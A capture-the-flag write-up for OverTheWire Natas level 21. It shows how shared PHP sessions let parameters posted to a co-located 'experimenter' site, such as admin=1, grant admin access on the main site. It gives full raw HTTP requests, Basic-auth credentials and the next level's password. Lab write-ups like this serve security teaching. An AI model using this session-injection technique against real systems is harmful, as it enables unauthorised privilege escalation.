Website http://natas21.natas.labs.overthewire.org/ just shows text, which mentions it is co-located with http://natas21-experimenter.natas.labs.overthewire.org.

Source code is available for both, the one for natas21.natas.labs.overthewire.org just calls `session_start()` and `print_credentials`, so it is not possible to inject session variables.

The one for natas21-experimenter.natas.labs.overthewire.org however stores all request parameters into session variables. The key idea for this level is to realize that both sites share the same PHP sessions; an attacker can inject variables via natas21-experimenter.natas.labs.overthewire.org which are then read by natas21.natas.labs.overthewire.org.

Here is an example request to inject session variables on the natas21-experimenter.natas.labs.overthewire.org site:
```
POST /index.php?debug=foo HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
Content-Length: 64
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyMTo4OU9XclRrR21pTFpMdjEySlk0dExqMmM0RlcweG41Ng==
Upgrade-Insecure-Requests: 1
Origin: http://natas21-experimenter.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=foo
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

align=center&fontsize=100%25&bgcolor=black&submit=Update&admin=1
```

**Note** that in the request above I send to PHPSESSID cookie to force the server to generate a new session:
```
HTTP/1.1 200 OK
Date: Wed, 26 Jun 2024 03:45:40 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=4bs52vlivk8qudslmihno7ggjt; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 830
Connection: close
Content-Type: text/html; charset=UTF-8

...
```

Then I can just copy the PHPSESSID into a request to the main web site:
```
GET / HTTP/1.1
Host: natas21.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.1.851326341.1718765417; _ga_RD0K2239G0=GS1.1.1718765416.1.1.1718765646.0.0.0; PHPSESSID=4bs52vlivk8qudslmihno7ggjt
Connection: close

```

Password for the next level is `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`.

